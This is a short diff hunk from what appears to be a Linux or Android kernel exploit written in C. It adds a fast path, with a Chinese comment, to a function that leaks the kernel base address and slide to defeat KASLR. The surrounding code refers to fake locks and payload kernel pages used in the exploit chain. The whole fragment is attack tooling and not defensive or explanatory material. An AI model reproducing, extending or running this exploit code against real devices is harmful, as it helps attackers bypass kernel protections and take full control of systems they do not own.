@@ -403,6 +403,16 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
+  /* 动态符号已解析时跳过 slide leak */
+  if (g_dyn_symbols_ready && g_dyn_kaslr_base) {
+    kaslr_base = g_dyn_kaslr_base;
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    pr_success("slide-kaslr-skipped (dynamic) pid=%d base=%016llx slide=%016llx\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+    return 1;
+  }
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
